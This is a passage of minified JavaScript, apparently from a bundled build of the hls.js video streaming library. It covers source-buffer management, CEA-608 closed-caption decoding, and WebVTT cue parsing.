n=this.details,k=this.hls,e=this.mediaSource,y=n.fragments[0].start+n.totalduration,K=this.media.duration,ea=Object($a.a)(e.duration)?e.duration:0;n.live&&k.config.liveDurationInfinity?(Fa.b.log("[buffer-controller]: Media Source duration is set to Infinity"),e.duration=1/0,this.updateSeekableRange(n)):(y>ea&&y>K||!Object($a.a)(K))&&(Fa.b.log("[buffer-controller]: Updating Media Source duration to "+y.toFixed(3)),e.duration=y)}},ca.updateSeekableRange=function(n){var k=this.mediaSource,e=n.fragments;e.length&&n.live&&null!=k&&k.setLiveSeekableRange&&(e=Math.max(0,e[0].start),k.setLiveSeekableRange(e,Math.max(e,e+n.totalduration)))},ca.checkPendingTracks=function(){var n=this.bufferCodecEventsExpected,k=this.operationQueue,e=this.pendingTracks,y=Object.keys(e).length;if(y&&!n||2===y){if(this.createSourceBuffers(e),this.pendingTracks={},0===(n=Object.keys(this.sourceBuffer)).length)return void this.hls.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_INCOMPATIBLE_CODECS_ERROR,fatal:!0,reason:"could not create source buffer for media codec(s)"});n.forEach((function(K){k.executeNext(K)}))}},ca.createSourceBuffers=function(n){var k=this.sourceBuffer,e=this.mediaSource;if(!e)throw Error("createSourceBuffers called when mediaSource was null");var K,y=0;for(K in n)if(!k[K]){var ea=n[K];if(!ea)throw Error("source buffer exists for track "+K+", however track does not");var sa=ea.levelCodec||ea.codec,ya=ea.container+";codecs="+sa;Fa.b.log("[buffer-controller]: creating sourceBuffer("+ya+")");try{var Ea=k[K]=e.addSourceBuffer(ya),Ha=K;this.addBufferListener(Ha,"updatestart",this._onSBUpdateStart),this.addBufferListener(Ha,"updateend",this._onSBUpdateEnd),this.addBufferListener(Ha,"error",this._onSBUpdateError),this.tracks[K]={buffer:Ea,codec:sa,container:ea.container,levelCodec:ea.levelCodec,id:ea.id},y++}catch(Ua){Fa.b.error("[buffer-controller]: error while trying to add sourceBuffer: "+Ua.message),this.hls.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_ADD_CODEC_ERROR,fatal:!1,error:Ua,mimeType:ya})}}y&&this.hls.trigger(ua.a.BUFFER_CREATED,{tracks:this.tracks})},ca._onSBUpdateStart=function(n){this.operationQueue.current(n).onStart()},ca._onSBUpdateEnd=function(n){var k=this.operationQueue;k.current(n).onComplete(),k.shiftAndExecuteNext(n)},ca._onSBUpdateError=function(n,k){Fa.b.error("[buffer-controller]: "+n+" SourceBuffer error",k),this.hls.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_APPENDING_ERROR,fatal:!1}),(n=this.operationQueue.current(n))&&n.onError(k)},ca.removeExecutor=function(n,k,e){var y=this.media,K=this.mediaSource,ea=this.operationQueue,sa=this.sourceBuffer[n];if(!y||!K||!sa)return Fa.b.warn("[buffer-controller]: Attempting to remove from the "+n+" SourceBuffer, but it does not exist"),void ea.shiftAndExecuteNext(n);y=Object($a.a)(y.duration)?y.duration:1/0,K=Object($a.a)(K.duration)?K.duration:1/0,k=Math.max(0,k),(e=Math.min(e,y,K))>k?(Fa.b.log("[buffer-controller]: Removing ["+k+","+e+"] from the "+n+" SourceBuffer"),sa.remove(k,e)):ea.shiftAndExecuteNext(n)},ca.appendExecutor=function(n,k){var e=this.operationQueue,y=this.sourceBuffer[k];if(!y)return Fa.b.warn("[buffer-controller]: Attempting to append to the "+k+" SourceBuffer, but it does not exist"),void e.shiftAndExecuteNext(k);y.ended=!1,y.appendBuffer(n)},ca.blockBuffers=function(n,k){var e=this;if(void 0===k&&(k=this.getSourceBufferTypes()),!k.length)return Fa.b.log("[buffer-controller]: Blocking operation requested, but no SourceBuffers exist"),void Promise.resolve(n);var y=this.operationQueue,K=k.map((function(ea){return y.appendBlocker(ea)}));Promise.all(K).then((function(){n(),k.forEach((function(ea){var sa=e.sourceBuffer[ea];sa&&sa.updating||y.shiftAndExecuteNext(ea)}))}))},ca.getSourceBufferTypes=function(){return Object.keys(this.sourceBuffer)},ca.addBufferListener=function(n,k,e){var y=this.sourceBuffer[n];y&&(e=e.bind(this,n),this.listeners[n].push({event:k,listener:e}),y.addEventListener(k,e))},ca.removeBufferListeners=function(n){var k=this.sourceBuffer[n];k&&this.listeners[n].forEach((function(e){k.removeEventListener(e.event,e.listener)}))},ta}(),Sd={42:225,92:233,94:237,95:243,96:250,123:231,124:247,125:209,126:241,127:9608,128:174,129:176,130:189,131:191,132:8482,133:162,134:163,135:9834,136:224,137:32,138:232,139:226,140:234,141:238,142:244,143:251,144:193,145:201,146:211,147:218,148:220,149:252,150:8216,151:161,152:42,153:8217,154:9473,155:169,156:8480,157:8226,158:8220,159:8221,160:192,161:194,162:199,163:200,164:202,165:203,166:235,167:206,168:207,169:239,170:212,171:217,172:249,173:219,174:171,175:187,176:195,177:227,178:205,179:204,180:236,181:210,182:242,183:213,184:245,185:123,186:125,187:92,188:94,189:95,190:124,191:8764,192:196,193:228,194:214,195:246,196:223,197:165,198:164,199:9475,200:197,201:229,202:216,203:248,204:9487,205:9491,206:9495,207:9499},Td=function(ta){var ca=ta;return Sd.hasOwnProperty(ta)&&(ca=Sd[ta]),String.fromCharCode(ca)},Mc={17:1,18:3,21:5,22:7,23:9,16:11,19:12,20:14},vc={17:2,18:4,21:6,22:8,23:10,19:13,20:15},Ud={25:1,26:3,29:5,30:7,31:9,24:11,27:12,28:14},Id={25:2,26:4,29:6,30:8,31:10,27:13,28:15},me="white green blue cyan red yellow magenta black transparent".split(" ");!function(ta){ta[ta.ERROR=0]="ERROR",ta[ta.TEXT=1]="TEXT",ta[ta.WARNING=2]="WARNING",ta[ta.INFO=2]="INFO",ta[ta.DEBUG=3]="DEBUG",ta[ta.DATA=3]="DATA"}(jc||(jc={}));var gd,Vd=function(){function ta(){this.time=null,this.verboseLevel=jc.ERROR}return ta.prototype.log=function(ca,n){this.verboseLevel>=ca&&Fa.b.log(this.time+" ["+ca+"] "+n)},ta}(),fd=function(ta){for(var ca=[],n=0;n<ta.length;n++)ca.push(ta[n].toString(16));return ca},yd=function(){function ta(n,k,e,y,K){this.flash=this.background=this.italics=this.underline=this.foreground=void 0,this.foreground=n||"white",this.underline=k||!1,this.italics=e||!1,this.background=y||"black",this.flash=K||!1}var ca=ta.prototype;return ca.reset=function(){this.foreground="white",this.italics=this.underline=!1,this.background="black",this.flash=!1},ca.setStyles=function(n){for(var k=["foreground","underline","italics","background","flash"],e=0;e<k.length;e++){var y=k[e];n.hasOwnProperty(y)&&(this[y]=n[y])}},ca.isDefault=function(){return"white"===this.foreground&&!this.underline&&!this.italics&&"black"===this.background&&!this.flash},ca.equals=function(n){return this.foreground===n.foreground&&this.underline===n.underline&&this.italics===n.italics&&this.background===n.background&&this.flash===n.flash},ca.copy=function(n){this.foreground=n.foreground,this.underline=n.underline,this.italics=n.italics,this.background=n.background,this.flash=n.flash},ca.toString=function(){return"color="+this.foreground+", underline="+this.underline+", italics="+this.italics+", background="+this.background+", flash="+this.flash},ta}(),ec=function(){function ta(n,k,e,y,K,ea){this.penState=this.uchar=void 0,this.uchar=n||" ",this.penState=new yd(k,e,y,K,ea)}var ca=ta.prototype;return ca.reset=function(){this.uchar=" ",this.penState.reset()},ca.setChar=function(n,k){this.uchar=n,this.penState.copy(k)},ca.setPenState=function(n){this.penState.copy(n)},ca.equals=function(n){return this.uchar===n.uchar&&this.penState.equals(n.penState)},ca.copy=function(n){this.uchar=n.uchar,this.penState.copy(n.penState)},ca.isEmpty=function(){return" "===this.uchar&&this.penState.isDefault()},ta}(),Sc=function(){function ta(n){this.logger=this.cueStartTime=this.currPenState=this.pos=void 0,this.chars=[];for(var k=0;100>k;k++)this.chars.push(new ec);this.logger=n,this.pos=0,this.currPenState=new yd}var ca=ta.prototype;return ca.equals=function(n){for(var k=!0,e=0;100>e;e++)if(!this.chars[e].equals(n.chars[e])){k=!1;break}return k},ca.copy=function(n){for(var k=0;100>k;k++)this.chars[k].copy(n.chars[k])},ca.isEmpty=function(){for(var n=!0,k=0;100>k;k++)if(!this.chars[k].isEmpty()){n=!1;break}return n},ca.setCursor=function(n){this.pos!==n&&(this.pos=n),0>this.pos?(this.logger.log(jc.DEBUG,"Negative cursor position "+this.pos),this.pos=0):100<this.pos&&(this.logger.log(jc.DEBUG,"Too large cursor position "+this.pos),this.pos=100)},ca.moveCursor=function(n){var k=this.pos+n;if(1<n)for(n=this.pos+1;n<k+1;n++)this.chars[n].setPenState(this.currPenState);this.setCursor(k)},ca.backSpace=function(){this.moveCursor(-1),this.chars[this.pos].setChar(" ",this.currPenState)},ca.insertChar=function(n){144<=n&&this.backSpace();var k=Td(n);100<=this.pos?this.logger.log(jc.ERROR,"Cannot insert "+n.toString(16)+" ("+k+") at position "+this.pos+". Skipping it!"):(this.chars[this.pos].setChar(k,this.currPenState),this.moveCursor(1))},ca.clearFromPos=function(n){for(;100>n;n++)this.chars[n].reset()},ca.clear=function(){this.clearFromPos(0),this.pos=0,this.currPenState.reset()},ca.clearToEndOfRow=function(){this.clearFromPos(this.pos)},ca.getTextString=function(){for(var n=[],k=!0,e=0;100>e;e++){var y=this.chars[e].uchar;" "!==y&&(k=!1),n.push(y)}return k?"":n.join("")},ca.setPenStyles=function(n){this.currPenState.setStyles(n),this.chars[this.pos].setPenState(this.currPenState)},ta}(),zd=function(){function ta(n){this.logger=this.lastOutputScreen=this.nrRollUpRows=this.currRow=this.rows=void 0,this.rows=[];for(var k=0;15>k;k++)this.rows.push(new Sc(n));this.logger=n,this.currRow=14,this.lastOutputScreen=this.nrRollUpRows=null,this.reset()}var ca=ta.prototype;return ca.reset=function(){for(var n=0;15>n;n++)this.rows[n].clear();this.currRow=14},ca.equals=function(n){for(var k=!0,e=0;15>e;e++)if(!this.rows[e].equals(n.rows[e])){k=!1;break}return k},ca.copy=function(n){for(var k=0;15>k;k++)this.rows[k].copy(n.rows[k])},ca.isEmpty=function(){for(var n=!0,k=0;15>k;k++)if(!this.rows[k].isEmpty()){n=!1;break}return n},ca.backSpace=function(){this.rows[this.currRow].backSpace()},ca.clearToEndOfRow=function(){this.rows[this.currRow].clearToEndOfRow()},ca.insertChar=function(n){this.rows[this.currRow].insertChar(n)},ca.setPen=function(n){this.rows[this.currRow].setPenStyles(n)},ca.moveCursor=function(n){this.rows[this.currRow].moveCursor(n)},ca.setCursor=function(n){this.logger.log(jc.INFO,"setCursor: "+n),this.rows[this.currRow].setCursor(n)},ca.setPAC=function(n){this.logger.log(jc.INFO,"pacData = "+JSON.stringify(n));var k=n.row-1;if(this.nrRollUpRows&&k<this.nrRollUpRows-1&&(k=this.nrRollUpRows-1),this.nrRollUpRows&&this.currRow!==k){for(var e=0;15>e;e++)this.rows[e].clear();e=this.currRow+1-this.nrRollUpRows;var y=this.lastOutputScreen;if(y){var K=y.rows[e].cueStartTime,ea=this.logger.time;if(K&&null!==ea&&K<ea)for(K=0;K<this.nrRollUpRows;K++)this.rows[k-this.nrRollUpRows+K+1].copy(y.rows[e+K])}}this.currRow=k,k=this.rows[this.currRow],null!==n.indent&&(e=Math.max(n.indent-1,0),k.setCursor(n.indent),n.color=k.chars[e].penState.foreground),this.setPen({foreground:n.color,underline:n.underline,italics:n.italics,background:"black",flash:!1})},ca.setBkgData=function(n){this.logger.log(jc.INFO,"bkgData = "+JSON.stringify(n)),this.backSpace(),this.setPen(n),this.insertChar(32)},ca.setRollUpRows=function(n){this.nrRollUpRows=n},ca.rollUp=function(){if(null!==this.nrRollUpRows){this.logger.log(jc.TEXT,this.getDisplayText());var n=this.rows.splice(this.currRow+1-this.nrRollUpRows,1)[0];n.clear(),this.rows.splice(this.currRow,0,n),this.logger.log(jc.INFO,"Rolling up")}else this.logger.log(jc.DEBUG,"roll_up but nrRollUpRows not set yet")},ca.getDisplayText=function(n){n=n||!1;for(var k=[],e="",y=-1,K=0;15>K;K++){var ea=this.rows[K].getTextString();ea&&(y=K+1,n?k.push("Row "+y+": '"+ea+"'"):k.push(ea.trim()))}return 0<k.length&&(e=n?"["+k.join(" | ")+"]":k.join("\n")),e},ca.getTextAndFormat=function(){return this.rows},ta}(),Wd=function(){function ta(n,k,e){this.logger=this.cueStartTime=this.writeScreen=this.currRollUpRow=this.lastOutputScreen=this.nonDisplayedMemory=this.displayedMemory=this.verbose=this.mode=this.outputFilter=this.chNr=void 0,this.chNr=n,this.outputFilter=k,this.mode=null,this.verbose=0,this.displayedMemory=new zd(e),this.nonDisplayedMemory=new zd(e),this.lastOutputScreen=new zd(e),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.cueStartTime=this.mode=null,this.logger=e}var ca=ta.prototype;return ca.reset=function(){this.mode=null,this.displayedMemory.reset(),this.nonDisplayedMemory.reset(),this.lastOutputScreen.reset(),this.outputFilter.reset(),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.cueStartTime=this.mode=null},ca.getHandler=function(){return this.outputFilter},ca.setHandler=function(n){this.outputFilter=n},ca.setPAC=function(n){this.writeScreen.setPAC(n)},ca.setBkgData=function(n){this.writeScreen.setBkgData(n)},ca.setMode=function(n){n!==this.mode&&(this.mode=n,this.logger.log(jc.INFO,"MODE="+n),"MODE_POP-ON"===this.mode?this.writeScreen=this.nonDisplayedMemory:(this.writeScreen=this.displayedMemory,this.writeScreen.reset()),"MODE_ROLL-UP"!==this.mode&&(this.displayedMemory.nrRollUpRows=null,this.nonDisplayedMemory.nrRollUpRows=null),this.mode=n)},ca.insertChars=function(n){for(var k=0;k<n.length;k++)this.writeScreen.insertChar(n[k]);this.logger.log(jc.INFO,(this.writeScreen===this.displayedMemory?"DISP":"NON_DISP")+": "+this.writeScreen.getDisplayText(!0)),"MODE_PAINT-ON"!==this.mode&&"MODE_ROLL-UP"!==this.mode||(this.logger.log(jc.TEXT,"DISPLAYED: "+this.displayedMemory.getDisplayText(!0)),this.outputDataUpdate())},ca.ccRCL=function(){this.logger.log(jc.INFO,"RCL - Resume Caption Loading"),this.setMode("MODE_POP-ON")},ca.ccBS=function(){this.logger.log(jc.INFO,"BS - BackSpace"),"MODE_TEXT"!==this.mode&&(this.writeScreen.backSpace(),this.writeScreen===this.displayedMemory&&this.outputDataUpdate())},ca.ccAOF=function(){},ca.ccAON=function(){},ca.ccDER=function(){this.logger.log(jc.INFO,"DER- Delete to End of Row"),this.writeScreen.clearToEndOfRow(),this.outputDataUpdate()},ca.ccRU=function(n){this.logger.log(jc.INFO,"RU("+n+") - Roll Up"),this.writeScreen=this.displayedMemory,this.setMode("MODE_ROLL-UP"),this.writeScreen.setRollUpRows(n)},ca.ccFON=function(){this.logger.log(jc.INFO,"FON - Flash On"),this.writeScreen.setPen({flash:!0})},ca.ccRDC=function(){this.logger.log(jc.INFO,"RDC - Resume Direct Captioning"),this.setMode("MODE_PAINT-ON")},ca.ccTR=function(){this.logger.log(jc.INFO,"TR"),this.setMode("MODE_TEXT")},ca.ccRTD=function(){this.logger.log(jc.INFO,"RTD"),this.setMode("MODE_TEXT")},ca.ccEDM=function(){this.logger.log(jc.INFO,"EDM - Erase Displayed Memory"),this.displayedMemory.reset(),this.outputDataUpdate(!0)},ca.ccCR=function(){this.logger.log(jc.INFO,"CR - Carriage Return"),this.writeScreen.rollUp(),this.outputDataUpdate(!0)},ca.ccENM=function(){this.logger.log(jc.INFO,"ENM - Erase Non-displayed Memory"),this.nonDisplayedMemory.reset()},ca.ccEOC=function(){if(this.logger.log(jc.INFO,"EOC - End Of Caption"),"MODE_POP-ON"===this.mode){var n=this.displayedMemory;this.displayedMemory=this.nonDisplayedMemory,this.writeScreen=this.nonDisplayedMemory=n,this.logger.log(jc.TEXT,"DISP: "+this.displayedMemory.getDisplayText())}this.outputDataUpdate(!0)},ca.ccTO=function(n){this.logger.log(jc.INFO,"TO("+n+") - Tab Offset"),this.writeScreen.moveCursor(n)},ca.ccMIDROW=function(n){var k={flash:!1};k.underline=1==n%2,k.italics=46<=n,k.italics?k.foreground="white":k.foreground="white green blue cyan red yellow magenta".split(" ")[Math.floor(n/2)-16],this.logger.log(jc.INFO,"MIDROW: "+JSON.stringify(k)),this.writeScreen.setPen(k)},ca.outputDataUpdate=function(n){void 0===n&&(n=!1);var k=this.logger.time;null!==k&&this.outputFilter&&(null!==this.cueStartTime||this.displayedMemory.isEmpty()?this.displayedMemory.equals(this.lastOutputScreen)||(this.outputFilter.newCue(this.cueStartTime,k,this.lastOutputScreen),n&&this.outputFilter.dispatchCue&&this.outputFilter.dispatchCue(),this.cueStartTime=this.displayedMemory.isEmpty()?null:k):this.cueStartTime=k,this.lastOutputScreen.copy(this.displayedMemory))},ca.cueSplitAtTime=function(n){this.outputFilter&&(this.displayedMemory.isEmpty()||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,n,this.displayedMemory),this.cueStartTime=n))},ta}(),Xd=function(){function ta(n,k,e){this.channels=void 0,this.currentChannel=0,this.logger=this.cmdHistory=void 0;var y=new Vd;this.channels=[null,new Wd(n,k,y),new Wd(n+1,e,y)],this.cmdHistory={a:null,b:null},this.logger=y}var ca=ta.prototype;return ca.getHandler=function(n){return this.channels[n].getHandler()},ca.setHandler=function(n,k){this.channels[n].setHandler(k)},ca.addData=function(n,k){var e,y,K,ea=!1;for(this.logger.time=n,n=0;n<k.length;n+=2)if(y=127&k[n],K=127&k[n+1],0!==y||0!==K){if(this.logger.log(jc.DATA,"["+fd([k[n],k[n+1]])+"] -> ("+fd([y,K])+")"),(e=this.parseCmd(y,K))||(e=this.parseMidrow(y,K)),e||(e=this.parsePAC(y,K)),e||(e=this.parseBackgroundAttributes(y,K)),!e&&(ea=this.parseChars(y,K))){var sa=this.currentChannel;sa&&0<sa?this.channels[sa].insertChars(ea):this.logger.log(jc.WARNING,"No channel found yet. TEXT-MODE?")}e||ea||this.logger.log(jc.WARNING,"Couldn't parse cleaned data "+fd([y,K])+" orig: "+fd([k[n],k[n+1]]))}},ca.parseCmd=function(n,k){var e=this.cmdHistory;if(!((20===n||28===n||21===n||29===n)&&32<=k&&47>=k||(23===n||31===n)&&33<=k&&35>=k))return!1;if(e.a===n&&e.b===k)return e.a=null,e.b=null,this.logger.log(jc.DEBUG,"Repeated command ("+fd([n,k])+") is dropped"),!0;var y=20===n||21===n||23===n?1:2,K=this.channels[y];return 20===n||21===n||28===n||29===n?32===k?K.ccRCL():33===k?K.ccBS():34===k?K.ccAOF():35===k?K.ccAON():36===k?K.ccDER():37===k?K.ccRU(2):38===k?K.ccRU(3):39===k?K.ccRU(4):40===k?K.ccFON():41===k?K.ccRDC():42===k?K.ccTR():43===k?K.ccRTD():44===k?K.ccEDM():45===k?K.ccCR():46===k?K.ccENM():47===k&&K.ccEOC():K.ccTO(k-32),e.a=n,e.b=k,this.currentChannel=y,!0},ca.parseMidrow=function(n,k){var e;return(17===n||25===n)&&32<=k&&47>=k&&((e=17===n?1:2)!==this.currentChannel?(this.logger.log(jc.ERROR,"Mismatch channel in midrow parsing"),!1):!!(e=this.channels[e])&&(e.ccMIDROW(k),this.logger.log(jc.DEBUG,"MIDROW ("+fd([n,k])+")"),!0))},ca.parsePAC=function(n,k){var e=this.cmdHistory;if(!((17<=n&&23>=n||25<=n&&31>=n)&&64<=k&&127>=k||(16===n||24===n)&&64<=k&&95>=k))return!1;if(e.a===n&&e.b===k)return e.a=null,e.b=null,!0;var sa,y=23>=n?1:2,K=64<=k&&95>=k?1===y?Mc[n]:Ud[n]:1===y?vc[n]:Id[n],ea=this.channels[y];return(sa=!!ea)&&(ea.setPAC(this.interpretPAC(K,k)),e.a=n,e.b=k,this.currentChannel=y,sa=!0),sa},ca.interpretPAC=function(n,k){var e;return(n={color:null,italics:!1,indent:null,underline:!1,row:n}).underline=!(1&~(e=95<k?k-96:k-64)),13>=e?n.color="white green blue cyan red yellow magenta white".split(" ")[Math.floor(e/2)]:15>=e?(n.italics=!0,n.color="white"):n.indent=4*Math.floor((e-16)/2),n},ca.parseChars=function(n,k){var e,y,K=null,ea=null;return 25<=n?(e=2,ea=n-8):(e=1,ea=n),17<=ea&&19>=ea?(y=17===ea?k+80:18===ea?k+112:k+144,this.logger.log(jc.INFO,"Special char '"+Td(y)+"' in channel "+e),K=[y]):32<=n&&127>=n&&(K=0===k?[n]:[n,k]),K&&(e=fd(K),this.logger.log(jc.DEBUG,"Char codes =  "+e.join(",")),(e=this.cmdHistory).a=n,e.b=k),K},ca.parseBackgroundAttributes=function(n,k){var e;if(!((16===n||24===n)&&32<=k&&47>=k||(23===n||31===n)&&45<=k&&47>=k))return!1;var y={};return 16===n||24===n?(e=Math.floor((k-32)/2),y.background=me[e],1==k%2&&(y.background+="_semi")):45===k?y.background="transparent":(y.foreground="black",47===k&&(y.underline=!0)),this.channels[23>=n?1:2].setBkgData(y),(e=this.cmdHistory).a=n,e.b=k,!0},ca.reset=function(){for(var n=0;n<Object.keys(this.channels).length;n++){var k=this.channels[n];k&&k.reset()}this.cmdHistory={a:null,b:null}},ca.cueSplitAtTime=function(n){for(var k=0;k<this.channels.length;k++){var e=this.channels[k];e&&e.cueSplitAtTime(n)}},ta}(),Ad=function(){function ta(n,k){this.timelineController=void 0,this.cueRanges=[],this.trackName=void 0,this.screen=this.endTime=this.startTime=null,this.timelineController=n,this.trackName=k}var ca=ta.prototype;return ca.dispatchCue=function(){null!==this.startTime&&(this.timelineController.addCues(this.trackName,this.startTime,this.endTime,this.screen,this.cueRanges),this.startTime=null)},ca.newCue=function(n,k,e){(null===this.startTime||this.startTime>n)&&(this.startTime=n),this.endTime=k,this.screen=e,this.timelineController.createCaptionsTrack(this.trackName)},ca.reset=function(){this.cueRanges=[]},ta}(),ud=function(){function ta(y,K){return!("string"!=typeof K||!Array.isArray(y))&&(K=K.toLowerCase(),!!~y.indexOf(K)&&K)}function ca(y){for(var K=arguments.length,ea=Array(1<K?K-1:0),sa=1;sa<K;sa++)ea[sa-1]=arguments[sa];for(K=1;K<arguments.length;K++)for(var ya in ea=arguments[K])y[ya]=ea[ya];return y}function n(y,K,ea){var sa={enumerable:!0};this.hasBeenReset=!1;var ya="",Ea=!1,Ha=y,Ua=K,kb=ea,cb=null,ub="",gb=!0,Gb="auto",wb="start",bc=50,ic="middle",$b=50,Ec="middle";Object.defineProperty(this,"id",ca({},sa,{get:function(){return ya},set:function(Lb){ya=""+Lb}})),Object.defineProperty(this,"pauseOnExit",ca({},sa,{get:function(){return Ea},set:function(Lb){Ea=!!Lb}})),Object.defineProperty(this,"startTime",ca({},sa,{get:function(){return Ha},set:function(Lb){if("number"!=typeof Lb)throw new TypeError("Start time must be set to a number.");Ha=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"endTime",ca({},sa,{get:function(){return Ua},set:function(Lb){if("number"!=typeof Lb)throw new TypeError("End time must be set to a number.");Ua=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"text",ca({},sa,{get:function(){return kb},set:function(Lb){kb=""+Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"region",ca({},sa,{get:function(){return cb},set:function(Lb){cb=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"vertical",ca({},sa,{get:function(){return ub},set:function(Lb){if(!1===(Lb=ta(k,Lb)))throw new SyntaxError("An invalid or illegal string was specified.");ub=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"snapToLines",ca({},sa,{get:function(){return gb},set:function(Lb){gb=!!Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"line",ca({},sa,{get:function(){return Gb},set:function(Lb){if("number"!=typeof Lb&&"auto"!==Lb)throw new SyntaxError("An invalid number or illegal string was specified.");Gb=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"lineAlign",ca({},sa,{get:function(){return wb},set:function(Lb){if(!(Lb=ta(e,Lb)))throw new SyntaxError("An invalid or illegal string was specified.");wb=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"position",ca({},sa,{get:function(){return bc},set:function(Lb){if(0>Lb||100<Lb)throw Error("Position must be between 0 and 100.");bc=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"positionAlign",ca({},sa,{get:function(){return ic},set:function(Lb){if(!(Lb=ta(e,Lb)))throw new SyntaxError("An invalid or illegal string was specified.");ic=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"size",ca({},sa,{get:function(){return $b},set:function(Lb){if(0>Lb||100<Lb)throw Error("Size must be between 0 and 100.");$b=Lb,this.hasBeenReset=!0}})),Object.defineProperty(this,"align",ca({},sa,{get:function(){return Ec},set:function(Lb){if(!(Lb=ta(e,Lb)))throw new SyntaxError("An invalid or illegal string was specified.");Ec=Lb,this.hasBeenReset=!0}})),this.displayState=void 0}if("undefined"!=typeof self&&self.VTTCue)return self.VTTCue;var k=["","lr","rl"],e=["start","middle","end","left","right"];return n.prototype.getCueAsHTML=function(){return self.WebVTT.convertCueToDOMTree(self,this.text)},n}(),Bd=function(){function ta(){}return ta.prototype.decode=function(ca,n){if(!ca)return"";if("string"!=typeof ca)throw Error("Error - expected string data.");return decodeURIComponent(encodeURIComponent(ca))},ta}(),Nd=function(){function ta(){this.values=Object.create(null)}var ca=ta.prototype;return ca.set=function(n,k){this.get(n)||""===k||(this.values[n]=k)},ca.get=function(n,k,e){return e?this.has(n)?this.values[n]:k[e]:this.has(n)?this.values[n]:k},ca.has=function(n){return n in this.values},ca.alt=function(n,k,e){for(var y=0;y<e.length;++y)if(k===e[y]){this.set(n,k);break}},ca.integer=function(n,k){/^-?\d+$/.test(k)&&this.set(n,parseInt(k,10))},ca.percent=function(n,k){return!!(/^([\d]{1,3})(\.[\d]*)?%$/.test(k)&&(k=parseFloat(k),0<=k&&100>=k))&&(this.set(n,k),!0)},ta}(),Fd=new ud(0,0,""),Xc="middle"===Fd.align?"middle":"center",de=function(){function ta(){this.state="INITIAL",this.buffer="",this.decoder=new Bd,this.regionList=[],this.cue=null,this.onflush=this.onparsingerror=this.oncue=void 0}var ca=ta.prototype;return ca.parse=function(n){function k(){var ea=e.buffer,sa=0;for(ea=ea.replace(/<br(?: \/)?>/gi,"\n");sa<ea.length&&"\r"!==ea[sa]&&"\n"!==ea[sa];)++sa;var ya=ea.substr(0,sa);return"\r"===ea[sa]&&++sa,"\n"===ea[sa]&&++sa,e.buffer=ea.substr(sa),ya}var e=this;n&&(e.buffer+=e.decoder.decode(n,{stream:!0}));try{if(n="","INITIAL"===e.state){if(!/\r\n|\n/.test(e.buffer))return this;var y=(n=k()).match(/^(\u00ef\u00bb\u00bf)?WEBVTT([ \t].*)?$/);if(!y||!y[0])throw Error("Malformed WebVTT signature.");e.state="HEADER"}for(y=!1;e.buffer;){if(!/\r\n|\n/.test(e.buffer))return this;switch(y?y=!1:n=k(),e.state){case"HEADER":/:/.test(n)?qa(n,(function(ea,sa){}),/:/):n||(e.state="ID");continue;case"NOTE":n||(e.state="ID");continue;case"ID":if(/^NOTE($|[ \t])/.test(n)){e.state="NOTE";break}if(!n)continue;if(e.cue=new ud(0,0,""),e.state="CUE",-1===n.indexOf("--\x3e")){e.cue.id=n;continue}case"CUE":if(!e.cue){e.state="BADCUE";continue}try{va(n,e.cue,e.regionList)}catch(ea){e.cue=null,e.state="BADCUE";continue}e.state="CUETEXT";continue;case"CUETEXT":var K=-1!==n.indexOf("--\x3e");if(!n||K&&(y=!0)){e.oncue&&e.cue&&e.oncue(e.cue),e.cue=null,e.state="ID";continue}if(null===e.cue)continue;e.cue.text&&(e.cue.text+="\n"),e.cue.text+=n;continue;case"BADCUE":n||(e.state="ID")}}}catch(ea){"CUETEXT"===e.state&&e.cue&&e.oncue&&e.oncue(e.cue),e.cue=null,e.state="INITIAL"===e.state?"BADWEBVTT":"BADCUE"}return this},ca.flush=function(){try{if((this.cue||"HEADER"===this.state)&&(this.buffer+="\n\n",this.parse()),"INITIAL"===this.state||"BADWEBVTT"===this.state)throw Error("Malformed WebVTT signature.")}catch(n){this.onparsingerror&&this.onparsingerror(n)}return this.onflush&&this.onflush(),this},ta}(),od=Na(7),fe=Na(15),ee=/\r\n|\n\r|\n|\r/g,Od=function(ta,ca,n){return void 0===n&&(n=0),ta.substr(n,ca.length)===ca},Gd=function(ta){for(var ca=5381,n=ta.length;n;)ca=33*ca^ta.charCodeAt(--n);return(ca>>>0).toString()},ge=/^(\d{2,}):(\d{2}):(\d{2}):(\d{2})\.?(\d+)?$/,Pd=/^(\d*(?:\.\d*)?)(h|m|s|ms|f|t)$/,ue={left:"start",center:"center",right:"end",start:"start",end:"end"},ne=function(){function ta(n){if(this.hls=void 0,this.media=null,this.config=void 0,this.enabled=!0,this.Cues=void 0,this.textTracks=[],this.tracks=[],this.initPTS=[],this.timescale=[],this.unparsedVttFrags=[],this.captionsTracks={},this.nonNativeCaptionsTracks={},this.cea608Parser1=void 0,this.cea608Parser2=void 0,this.lastSn=-1,this.prevCC=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!1}},this.hls=n,this.config=n.config,this.Cues=n.config.cueHandler,this.captionsProperties={textTrack1:{label:this.config.captionsTextTrack1Label,languageCode:this.config.captionsTextTrack1LanguageCode},textTrack2:{label:this.config.captionsTextTrack2Label,languageCode:this.config.captionsTextTrack2LanguageCode},textTrack3:{label:this.config.captionsTextTrack3Label,languageCode:this.config.captionsTextTrack3LanguageCode},textTrack4:{label:this.config.captionsTextTrack4Label,languageCode:this.config.captionsTextTrack4LanguageCode}},this.config.enableCEA708Captions){var k=new Ad(this,"textTrack1"),e=new Ad(this,"textTrack2"),y=new Ad(this,"textTrack3"),K=new Ad(this,"textTrack4");this.cea608Parser1=new Xd(1,k,e),this.cea608Parser2=new 